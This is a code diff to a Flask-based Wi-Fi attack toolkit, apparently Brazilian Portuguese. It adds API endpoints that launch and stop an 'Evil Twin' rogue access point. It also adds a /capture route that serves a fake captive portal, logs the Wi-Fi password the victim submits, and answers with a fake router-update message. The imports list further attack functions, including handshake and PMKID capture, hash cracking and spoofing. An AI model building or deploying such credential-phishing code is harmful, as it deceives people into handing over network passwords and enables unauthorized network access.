@@ -11,6 +11,8 @@ import wifi_auditor
 from wifi_auditor import run_command, set_monitor_mode, set_managed_mode, capture_pmkid, capture_handshake, crack_hash, identify_vendor, analyze_vulnerabilities, capture_wps, fix_drivers_wifi6, start_ghost_attack, boost_signal, start_wifite_expert, start_evil_twin, capture_vetor_x, run_autopilot
 from dsi_sniffer import DSISniffer, spoof, scan_network
 
+from dsi_twin import DSITwin
+
 app = Flask(__name__)
 
 # Variáveis globais
@@ -21,6 +23,7 @@ CSV_PREFIX = "web_scan_results"
 SESSION_LOGS = []
 SNIFFER_INSTANCE = None
 SPOOF_ACTIVE = False
+TWIN_INSTANCE = None
 
 def add_log(msg, log_type="info", is_command=False):
     timestamp = datetime.now().strftime("%H:%M:%S")
@@ -182,6 +185,38 @@ def restore():
     if SCAN_PROCESS: SCAN_PROCESS.terminate(); run_command("killall airodump-ng", sudo=True); SCAN_PROCESS = None
     if CURRENT_MONITOR_IFACE: set_managed_mode(CURRENT_MONITOR_IFACE); CURRENT_MONITOR_IFACE = None
     return jsonify({"status": "success"})
+
+@app.route('/api/twin/start', methods=['POST'])
+def start_twin():
+    global TWIN_INSTANCE, CURRENT_MANAGED_IFACE
+    data = request.get_json()
+    ssid = data.get('ssid')
+    iface = CURRENT_MANAGED_IFACE or "wlan0"
+    
+    if not TWIN_INSTANCE:
+        TWIN_INSTANCE = DSITwin(iface, ssid)
+        TWIN_INSTANCE.generate_configs()
+        TWIN_INSTANCE.start(log_callback=add_log)
+        return jsonify({"status": "success", "message": f"Evil Twin '{ssid}' ativo."})
+    return jsonify({"status": "error", "message": "Evil Twin já em execução."})
+
+@app.route('/api/twin/stop', methods=['POST'])
+def stop_twin():
+    global TWIN_INSTANCE
+    if TWIN_INSTANCE:
+        TWIN_INSTANCE.stop()
+        TWIN_INSTANCE = None
+        add_log("Evil Twin desativado.")
+    return jsonify({"status": "success"})
+
+@app.route('/capture', methods=['GET', 'POST'])
+def capture_page():
+    if request.method == 'POST':
+        password = request.form.get('password')
+        add_log(f"!!! [VITÓRIA] SENHA CAPTURADA VIA EVIL TWIN: {password}", log_type="error")
+        return "<h1>Atualização completa. Reiniciando roteador...</h1>"
+    # Serve o Portal Cativo se for um GET (redirecionamento DNS)
+    return render_template('captive.html')
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000, debug=False, threaded=True)
